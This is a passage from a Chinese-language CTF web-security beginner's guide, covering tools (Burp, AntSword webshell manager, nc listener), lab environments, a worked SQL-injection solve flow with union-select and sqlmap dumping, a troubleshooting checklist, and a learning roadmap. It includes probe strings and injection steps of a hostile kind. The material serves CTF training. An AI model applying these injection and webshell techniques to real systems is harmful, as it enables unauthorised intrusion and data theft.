| **蚁剑 AntSword**     | WebShell 图形化管理   | 传马后连（URL+密码）               |
| GitHack / dvcs-ripper | git/svn 泄露还原      | `python GitHack.py http://x/.git/` |
| CyberChef（在线）     | 编码解码瑞士军刀      | Magic 一键猜                       |
| nc                    | 监听反弹/OAST 接收    | `nc -lvnp 9999`                    |
| phpstudy / docker     | 本地搭漏洞环境复现 wp | sqlilabs、文件上传靶场             |

### 15.1 Burp 必会四面板

```
Proxy      抓包改包（Intercept 开关）
Repeater   改完反复发（Ctrl+R 发过来）——做题主战场
Intruder   标记变量爆破（§§ 包住要变的位置，挂 payload 字典）
Decoder    各种编码解码互转
```

### 15.2 环境建议

- 浏览器：Firefox（Burp 证书好装）或装证书后的 Chrome
- 一台虚拟机（Kali 或 Ubuntu）跑工具，Windows 装Burp + 蚁剑 + F12 也能打
- 本地练靶场：**sqli-labs**（注入 70 关）、upload-labs（上传 20 关）、DVWA、Pikachu

---

## 16. 完整解题流程

以一道典型注入题为例，串起全流程：

```
1. 摸底
   打开网址 → F12 看源码/注释 → 看 robots.txt → dirsearch 扫目录
   → 发现提示/没有额外信息

2. 功能点分析
   页面是个"新闻查询" → ?id=1 试注入

3. 判断注入
   ?id=1 and 1=1 / 1=2 → 页面变化 → 数字型注入成立！

4. 手工走流程（第 6.3 节四步）
   order by 3 → union select 1,2,3 → database()=ctf
   → information_schema 拿表 flag、列 flag → 拖库拿 flag

5. 工具复核（可选）
   sqlmap -u ... --dump -T flag

6. 提交 → 错了就回头检查闭合方式/列数/过滤
```

**卡住检查清单**：

- 页面没变化 → 换闭合（`'` `")` `'）`）、试报错/盲注、参数在 POST/Cookie 里呢？
- 输入 `'` 就 403 → 有 WAF/过滤 → 上绕过章（13.4）
- 注入点找不到 → 扫目录找备份源码 → 转代码审计题
- 拿到 admin 密码登不进 → 二次注入/逻辑漏洞/爆破弱口令
- flag 在数据库外 → RCE 方向走（上传/RCE/包含）读 `/flag`
- 打不动 → 本地搭环境复现，看清后端到底怎么写的

---

## 17. 学习路线与资源

### 17.1 建议顺序（别跳）

```
HTML/JS 皮毛 + HTTP 协议 → SQL 基本语法
  → 【信息收集 + 改包/改Cookie 级别的"社工题"】
    → SQL 注入（sqli-labs 1~20 关）→ sqlmap
      → 文件上传（upload-labs 全关）
        → 命令执行/代码执行 → 文件包含
          → XSS/CSRF 概念 → 反序列化 → SSRF
            → 组合拳 + 框架漏洞（ThinkPHP 等）
```

### 17.2 练习平台

- **ctfshow Web 入门系列** —— 分主题刷，配本篇目录正好
- **BUUCTF / 攻防世界 Web 区** —— 复盘题海量，wp 好找
- **CTFHub 技能树** —— 按技能点逐个练（含 .git 泄露等专题）
- 靶场：sqli-labs、upload-labs、Pikachu、DVWA（本地 docker 一键起）

### 17.3 参考资料

- 《从 0 到 1：CTFer 成长之路》—— Web 方向入门首选
- 菜鸟教程（runoob）的 SQL / HTML / PHP 三件套——够用就行
- 《白帽子讲 Web 安全》（道哥）—— 稍后进阶再看
- PayloadAllTheThings（GitHub）—— 各类 payload 速查字典
- SecLists —— 目录/密码字典合集

### 17.4 给新手的几句实在话

1. **Burp 先装好**：Web 题一半的题眼在请求/响应里，浏览器右键"检查"只是起点
2. **每个输入框都问候一遍**：`' " < > ../ admin'--`，看服务器"表情"（报错/变化/延迟）
3. 手工注入走通 sqli-labs 前几关再上 sqlmap——**工具帮你提速，不帮你懂原理**
4. 拿到源码的题，先全局搜危险函数，比黑盒乱试快十倍
5. 记 payload 小本本：每个"过滤了 X → 用 Y 绕过"的对应关系，都是下次的秒杀键
6. 三篇总结配合食用：Web 找入口，RE 拆加密，Pwn 打底层——**一个 CTF 队伍的三条腿**

---

*完 —— Web 安全的本质：服务器永远不该相信任何来自客户端的字节，而题目里它总有一处信了。*